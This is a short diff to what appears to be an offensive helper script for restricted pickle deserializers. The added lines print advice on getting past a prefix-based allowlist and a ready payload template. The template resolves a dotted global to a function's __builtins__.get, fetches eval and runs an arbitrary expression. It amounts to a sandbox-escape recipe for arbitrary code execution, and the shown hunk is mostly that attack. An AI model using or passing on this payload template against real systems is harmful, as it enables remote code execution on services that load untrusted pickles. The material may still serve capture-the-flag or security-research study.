@@ -171,6 +171,8 @@ if source_path:
     if "startswith" in text:
         print("prefix_filter_review=check whether the filter applies only to the complete requested name; an allowed leading object may expose nested attributes")
         print("mapping_note=pickle has no GETATTR or GETITEM opcode; GET/BINGET read memo slots. A dotted global ending in function.__builtins__.get can resolve a bound mapping method; invoke it with a tuple and REDUCE")
+        print("function_note=CPython function objects expose __builtins__ directly; use function.__builtins__.get, not function.__globals__.__builtins__.get")
+        print('compiler_template=[{"op":"global","module":"<allowed_module>","name":"<Class>.<method>.__builtins__.get"},{"op":"string","value":"eval"},{"op":"call","count":1},{"op":"string","value":"<expression>"},{"op":"call","count":1}]')
 
 raw = load_payload(payload_value, payload_format)
 if raw is not None:
